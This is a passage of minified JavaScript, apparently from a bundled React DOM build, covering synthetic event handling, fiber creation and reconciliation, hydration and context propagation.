          which: function (e) {
            return e.type === `keypress`
              ? xn(e)
              : e.type === `keydown` || e.type === `keyup`
                ? e.keyCode
                : 0;
          },
        }),
      ),
      Gn = wn(
        h({}, Mn, {
          pointerId: 0,
          width: 0,
          height: 0,
          pressure: 0,
          tangentialPressure: 0,
          tiltX: 0,
          tiltY: 0,
          twist: 0,
          pointerType: 0,
          isPrimary: 0,
        }),
      ),
      Kn = wn(
        h({}, Dn, {
          touches: 0,
          targetTouches: 0,
          changedTouches: 0,
          altKey: 0,
          metaKey: 0,
          ctrlKey: 0,
          shiftKey: 0,
          getModifierState: Un,
        }),
      ),
      qn = wn(h({}, Tn, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 })),
      Jn = wn(
        h({}, Mn, {
          deltaX: function (e) {
            return `deltaX` in e
              ? e.deltaX
              : `wheelDeltaX` in e
                ? -e.wheelDeltaX
                : 0;
          },
          deltaY: function (e) {
            return `deltaY` in e
              ? e.deltaY
              : `wheelDeltaY` in e
                ? -e.wheelDeltaY
                : `wheelDelta` in e
                  ? -e.wheelDelta
                  : 0;
          },
          deltaZ: 0,
          deltaMode: 0,
        }),
      ),
      Yn = wn(h({}, Tn, { newState: 0, oldState: 0 })),
      Xn = [9, 13, 27, 32],
      Zn = mn && `CompositionEvent` in window,
      Qn = null;
    mn && `documentMode` in document && (Qn = document.documentMode);
    var $n = mn && `TextEvent` in window && !Qn,
      er = mn && (!Zn || (Qn && 8 < Qn && 11 >= Qn)),
      tr = ` `,
      nr = !1;
    function rr(e, t) {
      switch (e) {
        case `keyup`:
          return Xn.indexOf(t.keyCode) !== -1;
        case `keydown`:
          return t.keyCode !== 229;
        case `keypress`:
        case `mousedown`:
        case `focusout`:
          return !0;
        default:
          return !1;
      }
    }
    function ir(e) {
      return (
        (e = e.detail),
        typeof e == `object` && `data` in e ? e.data : null
      );
    }
    var P = !1;
    function ar(e, t) {
      switch (e) {
        case `compositionend`:
          return ir(t);
        case `keypress`:
          return t.which === 32 ? ((nr = !0), tr) : null;
        case `textInput`:
          return ((e = t.data), e === tr && nr ? null : e);
        default:
          return null;
      }
    }
    function or(e, t) {
      if (P)
        return e === `compositionend` || (!Zn && rr(e, t))
          ? ((e = bn()), (yn = vn = _n = null), (P = !1), e)
          : null;
      switch (e) {
        case `paste`:
          return null;
        case `keypress`:
          if (
            !(t.ctrlKey || t.altKey || t.metaKey) ||
            (t.ctrlKey && t.altKey)
          ) {
            if (t.char && 1 < t.char.length) return t.char;
            if (t.which) return String.fromCharCode(t.which);
          }
          return null;
        case `compositionend`:
          return er && t.locale !== `ko` ? null : t.data;
        default:
          return null;
      }
    }
    var sr = {
      color: !0,
      date: !0,
      datetime: !0,
      "datetime-local": !0,
      email: !0,
      month: !0,
      number: !0,
      password: !0,
      range: !0,
      search: !0,
      tel: !0,
      text: !0,
      time: !0,
      url: !0,
      week: !0,
    };
    function cr(e) {
      var t = e && e.nodeName && e.nodeName.toLowerCase();
      return t === `input` ? !!sr[e.type] : t === `textarea`;
    }
    function lr(e, t, n, r) {
      (cn ? (ln ? ln.push(r) : (ln = [r])) : (cn = r),
        (t = Ed(t, `onChange`)),
        0 < t.length &&
          ((n = new En(`onChange`, `change`, null, n, r)),
          e.push({ event: n, listeners: t })));
    }
    var ur = null,
      dr = null;
    function fr(e) {
      yd(e, 0);
    }
    function pr(e) {
      if (Bt(St(e))) return e;
    }
    function mr(e, t) {
      if (e === `change`) return t;
    }
    var hr = !1;
    if (mn) {
      var gr;
      if (mn) {
        var _r = `oninput` in document;
        if (!_r) {
          var vr = document.createElement(`div`);
          (vr.setAttribute(`oninput`, `return;`),
            (_r = typeof vr.oninput == `function`));
        }
        gr = _r;
      } else gr = !1;
      hr = gr && (!document.documentMode || 9 < document.documentMode);
    }
    function yr() {
      ur && (ur.detachEvent(`onpropertychange`, br), (dr = ur = null));
    }
    function br(e) {
      if (e.propertyName === `value` && pr(dr)) {
        var t = [];
        (lr(t, dr, e, sn(e)), fn(fr, t));
      }
    }
    function xr(e, t, n) {
      e === `focusin`
        ? (yr(), (ur = t), (dr = n), ur.attachEvent(`onpropertychange`, br))
        : e === `focusout` && yr();
    }
    function Sr(e) {
      if (e === `selectionchange` || e === `keyup` || e === `keydown`)
        return pr(dr);
    }
    function F(e, t) {
      if (e === `click`) return pr(t);
    }
    function Cr(e, t) {
      if (e === `input` || e === `change`) return pr(t);
    }
    function wr(e, t) {
      return (e === t && (e !== 0 || 1 / e == 1 / t)) || (e !== e && t !== t);
    }
    var Tr = typeof Object.is == `function` ? Object.is : wr;
    function Er(e, t) {
      if (Tr(e, t)) return !0;
      if (typeof e != `object` || !e || typeof t != `object` || !t) return !1;
      var n = Object.keys(e),
        r = Object.keys(t);
      if (n.length !== r.length) return !1;
      for (r = 0; r < n.length; r++) {
        var i = n[r];
        if (!Te.call(t, i) || !Tr(e[i], t[i])) return !1;
      }
      return !0;
    }
    function Dr(e) {
      for (; e && e.firstChild; ) e = e.firstChild;
      return e;
    }
    function Or(e, t) {
      var n = Dr(e);
      e = 0;
      for (var r; n; ) {
        if (n.nodeType === 3) {
          if (((r = e + n.textContent.length), e <= t && r >= t))
            return { node: n, offset: t - e };
          e = r;
        }
        a: {
          for (; n; ) {
            if (n.nextSibling) {
              n = n.nextSibling;
              break a;
            }
            n = n.parentNode;
          }
          n = void 0;
        }
        n = Dr(n);
      }
    }
    function kr(e, t) {
      return e && t
        ? e === t
          ? !0
          : e && e.nodeType === 3
            ? !1
            : t && t.nodeType === 3
              ? kr(e, t.parentNode)
              : `contains` in e
                ? e.contains(t)
                : e.compareDocumentPosition
                  ? !!(e.compareDocumentPosition(t) & 16)
                  : !1
        : !1;
    }
    function Ar(e) {
      e =
        e != null &&
        e.ownerDocument != null &&
        e.ownerDocument.defaultView != null
          ? e.ownerDocument.defaultView
          : window;
      for (var t = Vt(e.document); t instanceof e.HTMLIFrameElement; ) {
        try {
          var n = typeof t.contentWindow.location.href == `string`;
        } catch {
          n = !1;
        }
        if (n) e = t.contentWindow;
        else break;
        t = Vt(e.document);
      }
      return t;
    }
    function jr(e) {
      var t = e && e.nodeName && e.nodeName.toLowerCase();
      return (
        t &&
        ((t === `input` &&
          (e.type === `text` ||
            e.type === `search` ||
            e.type === `tel` ||
            e.type === `url` ||
            e.type === `password`)) ||
          t === `textarea` ||
          e.contentEditable === `true`)
      );
    }
    var Mr = mn && `documentMode` in document && 11 >= document.documentMode,
      Nr = null,
      Pr = null,
      Fr = null,
      Ir = !1;
    function Lr(e, t, n) {
      var r =
        n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
      Ir ||
        Nr == null ||
        Nr !== Vt(r) ||
        ((r = Nr),
        `selectionStart` in r && jr(r)
          ? (r = { start: r.selectionStart, end: r.selectionEnd })
          : ((r = (
              (r.ownerDocument && r.ownerDocument.defaultView) ||
              window
            ).getSelection()),
            (r = {
              anchorNode: r.anchorNode,
              anchorOffset: r.anchorOffset,
              focusNode: r.focusNode,
              focusOffset: r.focusOffset,
            })),
        (Fr && Er(Fr, r)) ||
          ((Fr = r),
          (r = Ed(Pr, `onSelect`)),
          0 < r.length &&
            ((t = new En(`onSelect`, `select`, null, t, n)),
            e.push({ event: t, listeners: r }),
            (t.target = Nr))));
    }
    function Rr(e, t) {
      var n = {};
      return (
        (n[e.toLowerCase()] = t.toLowerCase()),
        (n[`Webkit` + e] = `webkit` + t),
        (n[`Moz` + e] = `moz` + t),
        n
      );
    }
    var zr = {
        animationend: Rr(`Animation`, `AnimationEnd`),
        animationiteration: Rr(`Animation`, `AnimationIteration`),
        animationstart: Rr(`Animation`, `AnimationStart`),
        transitionrun: Rr(`Transition`, `TransitionRun`),
        transitionstart: Rr(`Transition`, `TransitionStart`),
        transitioncancel: Rr(`Transition`, `TransitionCancel`),
        transitionend: Rr(`Transition`, `TransitionEnd`),
      },
      Br = {},
      Vr = {};
    mn &&
      ((Vr = document.createElement(`div`).style),
      `AnimationEvent` in window ||
        (delete zr.animationend.animation,
        delete zr.animationiteration.animation,
        delete zr.animationstart.animation),
      `TransitionEvent` in window || delete zr.transitionend.transition);
    function Hr(e) {
      if (Br[e]) return Br[e];
      if (!zr[e]) return e;
      var t = zr[e],
        n;
      for (n in t) if (t.hasOwnProperty(n) && n in Vr) return (Br[e] = t[n]);
      return e;
    }
    var Ur = Hr(`animationend`),
      Wr = Hr(`animationiteration`),
      Gr = Hr(`animationstart`),
      Kr = Hr(`transitionrun`),
      qr = Hr(`transitionstart`),
      Jr = Hr(`transitioncancel`),
      Yr = Hr(`transitionend`),
      Xr = new Map(),
      Zr =
        `abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel`.split(
          ` `,
        );
    Zr.push(`scrollEnd`);
    function Qr(e, t) {
      (Xr.set(e, t), Dt(t, [e]));
    }
    var $r =
        typeof reportError == `function`
          ? reportError
          : function (e) {
              if (
                typeof window == `object` &&
                typeof window.ErrorEvent == `function`
              ) {
                var t = new window.ErrorEvent(`error`, {
                  bubbles: !0,
                  cancelable: !0,
                  message:
                    typeof e == `object` && e && typeof e.message == `string`
                      ? String(e.message)
                      : String(e),
                  error: e,
                });
                if (!window.dispatchEvent(t)) return;
              } else if (
                typeof process == `object` &&
                typeof process.emit == `function`
              ) {
                process.emit(`uncaughtException`, e);
                return;
              }
              console.error(e);
            },
      ei = [],
      ti = 0,
      ni = 0;
    function ri() {
      for (var e = ti, t = (ni = ti = 0); t < e; ) {
        var n = ei[t];
        ei[t++] = null;
        var r = ei[t];
        ei[t++] = null;
        var i = ei[t];
        ei[t++] = null;
        var a = ei[t];
        if (((ei[t++] = null), r !== null && i !== null)) {
          var o = r.pending;
          (o === null ? (i.next = i) : ((i.next = o.next), (o.next = i)),
            (r.pending = i));
        }
        a !== 0 && si(n, i, a);
      }
    }
    function ii(e, t, n, r) {
      ((ei[ti++] = e),
        (ei[ti++] = t),
        (ei[ti++] = n),
        (ei[ti++] = r),
        (ni |= r),
        (e.lanes |= r),
        (e = e.alternate),
        e !== null && (e.lanes |= r));
    }
    function ai(e, t, n, r) {
      return (ii(e, t, n, r), ci(e));
    }
    function oi(e, t) {
      return (ii(e, null, null, t), ci(e));
    }
    function si(e, t, n) {
      e.lanes |= n;
      var r = e.alternate;
      r !== null && (r.lanes |= n);
      for (var i = !1, a = e.return; a !== null; )
        ((a.childLanes |= n),
          (r = a.alternate),
          r !== null && (r.childLanes |= n),
          a.tag === 22 &&
            ((e = a.stateNode), e === null || e._visibility & 1 || (i = !0)),
          (e = a),
          (a = a.return));
      return e.tag === 3
        ? ((a = e.stateNode),
          i &&
            t !== null &&
            ((i = 31 - He(n)),
            (e = a.hiddenUpdates),
            (r = e[i]),
            r === null ? (e[i] = [t]) : r.push(t),
            (t.lane = n | 536870912)),
          a)
        : null;
    }
    function ci(e) {
      if (50 < du) throw ((du = 0), (fu = null), Error(i(185)));
      for (var t = e.return; t !== null; ) ((e = t), (t = e.return));
      return e.tag === 3 ? e.stateNode : null;
    }
    var li = {};
    function ui(e, t, n, r) {
      ((this.tag = e),
        (this.key = n),
        (this.sibling =
          this.child =
          this.return =
          this.stateNode =
          this.type =
          this.elementType =
            null),
        (this.index = 0),
        (this.refCleanup = this.ref = null),
        (this.pendingProps = t),
        (this.dependencies =
          this.memoizedState =
          this.updateQueue =
          this.memoizedProps =
            null),
        (this.mode = r),
        (this.subtreeFlags = this.flags = 0),
        (this.deletions = null),
        (this.childLanes = this.lanes = 0),
        (this.alternate = null));
    }
    function di(e, t, n, r) {
      return new ui(e, t, n, r);
    }
    function fi(e) {
      return ((e = e.prototype), !(!e || !e.isReactComponent));
    }
    function pi(e, t) {
      var n = e.alternate;
      return (
        n === null
          ? ((n = di(e.tag, t, e.key, e.mode)),
            (n.elementType = e.elementType),
            (n.type = e.type),
            (n.stateNode = e.stateNode),
            (n.alternate = e),
            (e.alternate = n))
          : ((n.pendingProps = t),
            (n.type = e.type),
            (n.flags = 0),
            (n.subtreeFlags = 0),
            (n.deletions = null)),
        (n.flags = e.flags & 65011712),
        (n.childLanes = e.childLanes),
        (n.lanes = e.lanes),
        (n.child = e.child),
        (n.memoizedProps = e.memoizedProps),
        (n.memoizedState = e.memoizedState),
        (n.updateQueue = e.updateQueue),
        (t = e.dependencies),
        (n.dependencies =
          t === null ? null : { lanes: t.lanes, firstContext: t.firstContext }),
        (n.sibling = e.sibling),
        (n.index = e.index),
        (n.ref = e.ref),
        (n.refCleanup = e.refCleanup),
        n
      );
    }
    function mi(e, t) {
      e.flags &= 65011714;
      var n = e.alternate;
      return (
        n === null
          ? ((e.childLanes = 0),
            (e.lanes = t),
            (e.child = null),
            (e.subtreeFlags = 0),
            (e.memoizedProps = null),
            (e.memoizedState = null),
            (e.updateQueue = null),
            (e.dependencies = null),
            (e.stateNode = null))
          : ((e.childLanes = n.childLanes),
            (e.lanes = n.lanes),
            (e.child = n.child),
            (e.subtreeFlags = 0),
            (e.deletions = null),
            (e.memoizedProps = n.memoizedProps),
            (e.memoizedState = n.memoizedState),
            (e.updateQueue = n.updateQueue),
            (e.type = n.type),
            (t = n.dependencies),
            (e.dependencies =
              t === null
                ? null
                : { lanes: t.lanes, firstContext: t.firstContext })),
        e
      );
    }
    function hi(e, t, n, r, a, o) {
      var s = 0;
      if (((r = e), typeof e == `function`)) fi(e) && (s = 1);
      else if (typeof e == `string`)
        s = Uf(e, n, ue.current)
          ? 26
          : e === `html` || e === `head` || e === `body`
            ? 27
            : 5;
      else
        a: switch (e) {
          case te:
            return (
              (e = di(31, n, t, a)),
              (e.elementType = te),
              (e.lanes = o),
              e
            );
          case y:
            return gi(n.children, a, o, t);
          case b:
            ((s = 8), (a |= 24));
            break;
          case x:
            return (
              (e = di(12, n, t, a | 2)),
              (e.elementType = x),
              (e.lanes = o),
              e
            );
          case ee:
            return (
              (e = di(13, n, t, a)),
              (e.elementType = ee),
              (e.lanes = o),
              e
            );
          case T:
            return (
              (e = di(19, n, t, a)),
              (e.elementType = T),
              (e.lanes = o),
              e
            );
          default:
            if (typeof e == `object` && e)
              switch (e.$$typeof) {
                case C:
                  s = 10;
                  break a;
                case S:
                  s = 9;
                  break a;
                case w:
                  s = 11;
                  break a;
                case E:
                  s = 14;
                  break a;
                case D:
                  ((s = 16), (r = null));
                  break a;
              }
            ((s = 29),
              (n = Error(i(130, e === null ? `null` : typeof e, ``))),
              (r = null));
        }
      return (
        (t = di(s, n, t, a)),
        (t.elementType = e),
        (t.type = r),
        (t.lanes = o),
        t
      );
    }
    function gi(e, t, n, r) {
      return ((e = di(7, e, r, t)), (e.lanes = n), e);
    }
    function _i(e, t, n) {
      return ((e = di(6, e, null, t)), (e.lanes = n), e);
    }
    function vi(e) {
      var t = di(18, null, null, 0);
      return ((t.stateNode = e), t);
    }
    function yi(e, t, n) {
      return (
        (t = di(4, e.children === null ? [] : e.children, e.key, t)),
        (t.lanes = n),
        (t.stateNode = {
          containerInfo: e.containerInfo,
          pendingChildren: null,
          implementation: e.implementation,
        }),
        t
      );
    }
    var bi = new WeakMap();
    function xi(e, t) {
      if (typeof e == `object` && e) {
        var n = bi.get(e);
        return n === void 0
          ? ((t = { value: e, source: t, stack: we(t) }), bi.set(e, t), t)
          : n;
      }
      return { value: e, source: t, stack: we(t) };
    }
    var Si = [],
      Ci = 0,
      wi = null,
      Ti = 0,
      Ei = [],
      Di = 0,
      Oi = null,
      ki = 1,
      Ai = ``;
    function ji(e, t) {
      ((Si[Ci++] = Ti), (Si[Ci++] = wi), (wi = e), (Ti = t));
    }
    function Mi(e, t, n) {
      ((Ei[Di++] = ki), (Ei[Di++] = Ai), (Ei[Di++] = Oi), (Oi = e));
      var r = ki;
      e = Ai;
      var i = 32 - He(r) - 1;
      ((r &= ~(1 << i)), (n += 1));
      var a = 32 - He(t) + i;
      if (30 < a) {
        var o = i - (i % 5);
        ((a = (r & ((1 << o) - 1)).toString(32)),
          (r >>= o),
          (i -= o),
          (ki = (1 << (32 - He(t) + i)) | (n << i) | r),
          (Ai = a + e));
      } else ((ki = (1 << a) | (n << i) | r), (Ai = e));
    }
    function Ni(e) {
      e.return !== null && (ji(e, 1), Mi(e, 1, 0));
    }
    function Pi(e) {
      for (; e === wi; )
        ((wi = Si[--Ci]), (Si[Ci] = null), (Ti = Si[--Ci]), (Si[Ci] = null));
      for (; e === Oi; )
        ((Oi = Ei[--Di]),
          (Ei[Di] = null),
          (Ai = Ei[--Di]),
          (Ei[Di] = null),
          (ki = Ei[--Di]),
          (Ei[Di] = null));
    }
    function Fi(e, t) {
      ((Ei[Di++] = ki),
        (Ei[Di++] = Ai),
        (Ei[Di++] = Oi),
        (ki = t.id),
        (Ai = t.overflow),
        (Oi = e));
    }
    var Ii = null,
      I = null,
      L = !1,
      Li = null,
      Ri = !1,
      zi = Error(i(519));
    function Bi(e) {
      throw (
        Ki(
          xi(
            Error(
              i(
                418,
                1 < arguments.length && arguments[1] !== void 0 && arguments[1]
                  ? `text`
                  : `HTML`,
                ``,
              ),
            ),
            e,
          ),
        ),
        zi
      );
    }
    function Vi(e) {
      var t = e.stateNode,
        n = e.type,
        r = e.memoizedProps;
      switch (((t[dt] = e), (t[ft] = r), n)) {
        case `dialog`:
          (Q(`cancel`, t), Q(`close`, t));
          break;
        case `iframe`:
        case `object`:
        case `embed`:
          Q(`load`, t);
          break;
        case `video`:
        case `audio`:
          for (n = 0; n < _d.length; n++) Q(_d[n], t);
          break;
        case `source`:
          Q(`error`, t);
          break;
        case `img`:
        case `image`:
        case `link`:
          (Q(`error`, t), Q(`load`, t));
          break;
        case `details`:
          Q(`toggle`, t);
          break;
        case `input`:
          (Q(`invalid`, t),
            Gt(
              t,
              r.value,
              r.defaultValue,
              r.checked,
              r.defaultChecked,
              r.type,
              r.name,
              !0,
            ));
          break;
        case `select`:
          Q(`invalid`, t);
          break;
        case `textarea`:
          (Q(`invalid`, t), Yt(t, r.value, r.defaultValue, r.children));
      }
      ((n = r.children),
        (typeof n != `string` &&
          typeof n != `number` &&
          typeof n != `bigint`) ||
        t.textContent === `` + n ||
        !0 === r.suppressHydrationWarning ||
        Md(t.textContent, n)
          ? (r.popover != null && (Q(`beforetoggle`, t), Q(`toggle`, t)),
            r.onScroll != null && Q(`scroll`, t),
            r.onScrollEnd != null && Q(`scrollend`, t),
            r.onClick != null && (t.onclick = an),
            (t = !0))
          : (t = !1),
        t || Bi(e, !0));
    }
    function Hi(e) {
      for (Ii = e.return; Ii; )
        switch (Ii.tag) {
          case 5:
          case 31:
          case 13:
            Ri = !1;
            return;
          case 27:
          case 3:
            Ri = !0;
            return;
          default:
            Ii = Ii.return;
        }
    }
    function Ui(e) {
      if (e !== Ii) return !1;
      if (!L) return (Hi(e), (L = !0), !1);
      var t = e.tag,
        n;
      if (
        ((n = t !== 3 && t !== 27) &&
          ((n = t === 5) &&
            ((n = e.type),
            (n =
              !(n !== `form` && n !== `button`) ||
              Ud(e.type, e.memoizedProps))),
          (n = !n)),
        n && I && Bi(e),
        Hi(e),
        t === 13)
      ) {
        if (((e = e.memoizedState), (e = e === null ? null : e.dehydrated), !e))
          throw Error(i(317));
        I = uf(e);
      } else if (t === 31) {
        if (((e = e.memoizedState), (e = e === null ? null : e.dehydrated), !e))
          throw Error(i(317));
        I = uf(e);
      } else
        t === 27
          ? ((t = I), Zd(e.type) ? ((e = lf), (lf = null), (I = e)) : (I = t))
          : (I = Ii ? cf(e.stateNode.nextSibling) : null);
      return !0;
    }
    function Wi() {
      ((I = Ii = null), (L = !1));
    }
    function Gi() {
      var e = Li;
      return (
        e !== null &&
          (Zl === null ? (Zl = e) : Zl.push.apply(Zl, e), (Li = null)),
        e
      );
    }
    function Ki(e) {
      Li === null ? (Li = [e]) : Li.push(e);
    }
    var qi = le(null),
      Ji = null,
      R = null;
    function Yi(e, t, n) {
      (N(qi, t._currentValue), (t._currentValue = n));
    }
    function Xi(e) {
      ((e._currentValue = qi.current), M(qi));
    }
    function Zi(e, t, n) {
      for (; e !== null; ) {
        var r = e.alternate;
        if (
          ((e.childLanes & t) === t
            ? r !== null && (r.childLanes & t) !== t && (r.childLanes |= t)
            : ((e.childLanes |= t), r !== null && (r.childLanes |= t)),
          e === n)
        )
          break;
        e = e.return;
      }
    }
    function Qi(e, t, n, r) {
      var a = e.child;
      for (a !== null && (a.return = e); a !== null; ) {
        var o = a.dependencies;
        if (o !== null) {
          var s = a.child;
          o = o.firstContext;
          a: for (; o !== null; ) {
            var c = o;
            o = a;
            for (var l = 0; l < t.length; l++)
              if (c.context === t[l]) {
                ((o.lanes |= n),
                  (c = o.alternate),
                  c !== null && (c.lanes |= n),
                  Zi(o.return, n, e),
                  r || (s = null));
                break a;
              }
            o = c.next;
          }
        } else if (a.tag === 18) {
          if (((s = a.return), s === null)) throw Error(i(341));
          ((s.lanes |= n),
            (o = s.alternate),
            o !== null && (o.lanes |= n),
            Zi(s, n, e),
            (s = null));
        } else s = a.child;
        if (s !== null) s.return = a;
        else
          for (s = a; s !== null; ) {
            if (s === e) {
              s = null;
              break;
            }
            if (((a = s.sibling), a !== null)) {
              ((a.return = s.return), (s = a));
              break;
            }
            s = s.return;
          }
        a = s;
      }
    }
    function z(e, t, n, r) {
      e = null;
      for (var a = t, o = !1; a !== null; ) {
        if (!o) {
          if (a.flags & 524288) o = !0;
          else if (a.flags & 262144) break;
        }
        if (a.tag === 10) {
          var s = a.alternate;
          if (s === null) throw Error(i(387));
          if (((s = s.memoizedProps), s !== null)) {
            var c = a.type;
            Tr(a.pendingProps.value, s.value) ||
              (e === null ? (e = [c]) : e.push(c));
          }
        } else if (a === pe.current) {
          if (((s = a.alternate), s === null)) throw Error(i(387));
          s.memoizedState.memoizedState !== a.memoizedState.memoizedState &&
            (e === null ? (e = [Qf]) : e.push(Qf));
        }
        a = a.return;
      }
      (e !== null && Qi(t, e, n, r), (t.flags |= 262144));
    }
    function $i(e) {
      for (e = e.firstContext; e !== null; ) {
        if (!Tr(e.context._currentValue, e.memoizedValue)) return !0;
        e = e.next;
      }
      return !1;
    }
    function ea(e) {
      ((Ji = e),
        (R = null),
        (e = e.dependencies),
        e !== null && (e.firstContext = null));
    }
    function ta(e) {
      return ra(Ji, e);
    }
    function na(e, t) {
      return (Ji === null && ea(e), ra(e, t));
    }
    function ra(e, t) {
      var n = t._currentValue;
      if (((t = { context: t, memoizedValue: n, next: null }), R === null)) {
        if (e === null) throw Error(i(308));
        ((R = t),
          (e.dependencies = { lanes: 0, firstContext: t }),
          (e.flags |= 524288));
      } else R = R.next = t;
      return n;
    }
    var ia =
        typeof AbortController < `u`
          ? AbortController
          : function () {
              var e = [],
                t = (this.signal = {
                  aborted: !1,
                  addEventListener: function (t, n) {
                    e.push(n);
                  },
                });
              this.abort = function () {
                ((t.aborted = !0),
                  e.forEach(function (e) {
                    return e();
                  }));
              };
            },
      aa = t.unstable_scheduleCallback,
      oa = t.unstable_NormalPriority,
      B = {
        $$typeof: C,
        Consumer: null,
        Provider: null,
        _currentValue: null,
        _currentValue2: null,
        _threadCount: 0,
      };
    function sa() {
      return { controller: new ia(), data: new Map(), refCount: 0 };
    }
    function ca(e) {
      (e.refCount--,
        e.refCount === 0 &&
          aa(oa, function () {
            e.controller.abort();
          }));
    }
    var la = null,
      ua = 0,
      da = 0,
      fa = null;
    function pa(e, t) {
      if (la === null) {
        var n = (la = []);
        ((ua = 0),
          (da = dd()),
          (fa = {
            status: `pending`,
            value: void 0,
            then: function (e) {
              n.push(e);
            },
          }));
      }
      return (ua++, t.then(ma, ma), t);
    }
    function ma() {
      if (--ua === 0 && la !== null) {
        fa !== null && (fa.status = `fulfilled`);
        var e = la;
        ((la = null), (da = 0), (fa = null));
        for (var t = 0; t < e.length; t++) (0, e[t])();
      }
    }
    function ha(e, t) {
      var n = [],
        r = {
          status: `pending`,
          value: null,
          reason: null,
          then: function (e) {
            n.push(e);
          },
        };
      return (
        e.then(
          function () {
            ((r.status = `fulfilled`), (r.value = t));
            for (var e = 0; e < n.length; e++) (0, n[e])(t);
          },
          function (e) {
            for (r.status = `rejected`, r.reason = e, e = 0; e < n.length; e++)
              (0, n[e])(void 0);
          },
        ),
        r
      );
    }
    var ga = A.S;
    A.S = function (e, t) {
      ((eu = Ae()),
        typeof t == `object` && t && typeof t.then == `function` && pa(e, t),
        ga !== null && ga(e, t));
    };
    var _a = le(null);
    function va() {
      var e = _a.current;
      return e === null ? q.pooledCache : e;
    }
    function ya(e, t) {
      t === null ? N(_a, _a.current) : N(_a, t.pool);
    }
    function ba() {
      var e = va();
      return e === null ? null : { parent: B._currentValue, pool: e };
    }
    var V = Error(i(460)),
      H = Error(i(474)),
      xa = Error(i(542)),
      Sa = { then: function () {} };
    function Ca(e) {
      return ((e = e.status), e === `fulfilled` || e === `rejected`);
    }
    function wa(e, t, n) {
      switch (
        ((n = e[n]),
        n === void 0 ? e.push(t) : n !== t && (t.then(an, an), (t = n)),
        t.status)
      ) {
        case `fulfilled`:
          return t.value;
        case `rejected`:
          throw ((e = t.reason), Oa(e), e);
        default:
          if (typeof t.status == `string`) t.then(an, an);
          else {
            if (((e = q), e !== null && 100 < e.shellSuspendCounter))
              throw Error(i(482));
            ((e = t),
              (e.status = `pending`),
              e.then(
                function (e) {
                  if (t.status === `pending`) {
                    var n = t;
                    ((n.status = `fulfilled`), (n.value = e));
                  }
                },
                function (e) {
                  if (t.status === `pending`) {
                    var n = t;
                    ((n.status = `rejected`), (n.reason = e));
                  }
                },
              ));
          }
          switch (t.status) {
            case `fulfilled`:
              return t.value;
            case `rejected`:
              throw ((e = t.reason), Oa(e), e);
          }
          throw ((Ea = t), V);
      }
    }
    function Ta(e) {
      try {
        var t = e._init;
        return t(e._payload);
      } catch (e) {
        throw typeof e == `object` && e && typeof e.then == `function`
          ? ((Ea = e), V)
          : e;
      }
    }
    var Ea = null;
    function Da() {
      if (Ea === null) throw Error(i(459));
      var e = Ea;
      return ((Ea = null), e);
    }
    function Oa(e) {
      if (e === V || e === xa) throw Error(i(483));
    }
    var ka = null,
      Aa = 0;
    function ja(e) {
      var t = Aa;
      return ((Aa += 1), ka === null && (ka = []), wa(ka, e, t));
    }
    function Ma(e, t) {
      ((t = t.props.ref), (e.ref = t === void 0 ? null : t));
    }
    function Na(e, t) {
      throw t.$$typeof === g
        ? Error(i(525))
        : ((e = Object.prototype.toString.call(t)),
          Error(
            i(
              31,
              e === `[object Object]`
                ? `object with keys {` + Object.keys(t).join(`, `) + `}`
                : e,
            ),
          ));
    }
    function Pa(e) {
      function t(t, n) {
        if (e) {
          var r = t.deletions;
          r === null ? ((t.deletions = [n]), (t.flags |= 16)) : r.push(n);
        }
      }
      function n(n, r) {
        if (!e) return null;
        for (; r !== null; ) (t(n, r), (r = r.sibling));
        return null;
      }
      function r(e) {
        for (var t = new Map(); e !== null; )
          (e.key === null ? t.set(e.index, e) : t.set(e.key, e),
            (e = e.sibling));
        return t;
      }
      function a(e, t) {
        return ((e = pi(e, t)), (e.index = 0), (e.sibling = null), e);
      }
      function o(t, n, r) {
        return (
          (t.index = r),
          e
            ? ((r = t.alternate),
              r === null
                ? ((t.flags |= 67108866), n)
                : ((r = r.index), r < n ? ((t.flags |= 67108866), n) : r))
            : ((t.flags |= 1048576), n)
        );
      }
      function s(t) {
        return (e && t.alternate === null && (t.flags |= 67108866), t);
      }
      function c(e, t, n, r) {
        return t === null || t.tag !== 6
          ? ((t = _i(n, e.mode, r)), (t.return = e), t)
          : ((t = a(t, n)), (t.return = e), t);
      }
      function l(e, t, n, r) {
        var i = n.type;
        return i === y
          ? d(e, t, n.props.children, r, n.key)
          : t !== null &&
              (t.elementType === i ||
                (typeof i == `object` &&
                  i &&
                  i.$$typeof === D &&
                  Ta(i) === t.type))
            ? ((t = a(t, n.props)), Ma(t, n), (t.return = e), t)
            : ((t = hi(n.type, n.key, n.props, null, e.mode, r)),
              Ma(t, n),
              (t.return = e),
              t);
      }
      function u(e, t, n, r) {
        return t === null ||
          t.tag !== 4 ||
          t.stateNode.containerInfo !== n.containerInfo ||
          t.stateNode.implementation !== n.implementation
          ? ((t = yi(n, e.mode, r)), (t.return = e), t)
          : ((t = a(t, n.children || [])), (t.return = e), t);
      }
      function d(e, t, n, r, i) {
        return t === null || t.tag !== 7
          ? ((t = gi(n, e.mode, r, i)), (t.return = e), t)
          : ((t = a(t, n)), (t.return = e), t);
      }
      function f(e, t, n) {
        if (
          (typeof t == `string` && t !== ``) ||
          typeof t == `number` ||
          typeof t == `bigint`
        )
          return ((t = _i(`` + t, e.mode, n)), (t.return = e), t);
        if (typeof t == `object` && t) {
          switch (t.$$typeof) {
            case _:
              return (
                (n = hi(t.type, t.key, t.props, null, e.mode, n)),
                Ma(n, t),
                (n.return = e),
                n
              );
            case v:
              return ((t = yi(t, e.mode, n)), (t.return = e), t);
            case D:
              return ((t = Ta(t)), f(e, t, n));
          }
          if (ae(t) || re(t))
            return ((t = gi(t, e.mode, n, null)), (t.return = e), t);
          if (typeof t.then == `function`) return f(e, ja(t), n);
          if (t.$$typeof === C) return f(e, na(e, t), n);
          Na(e, t);
        }
        return null;
      }
      function p(e, t, n, r) {
        var i = t === null ? null : t.key;
        if (
          (typeof n == `string` && n !== ``) ||
          typeof n == `number` ||
          typeof n == `bigint`
        )
